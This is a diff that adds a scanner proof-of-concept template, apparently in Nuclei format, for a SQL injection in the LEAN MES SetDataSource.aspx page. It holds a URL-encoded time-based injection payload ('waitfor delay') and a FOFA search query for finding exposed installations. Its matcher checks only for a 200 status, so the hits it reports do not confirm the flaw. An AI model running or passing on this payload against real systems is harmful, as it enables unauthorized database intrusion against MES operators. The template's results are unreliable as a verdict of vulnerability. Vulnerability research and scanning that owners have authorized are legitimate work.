@@ -1,0 +1,19 @@
+id: poc-vymu06pwxs9dgg6y
+info:
+  name: 深科特LEAN MES系统SetDataSource存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vymu06pwxs9dgg6y'
+  tags: rce,sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vymu06pwxs9dgg6y
+    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
+http:
+- raw:
+  - GET /SDP/SetDataSource.aspx?modelId=1&SourceType=%27%77%61%69%74%66%6F%72%20%64%65%6C%61%79%27%30%3A%30%3A%35%27%2D%2D HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
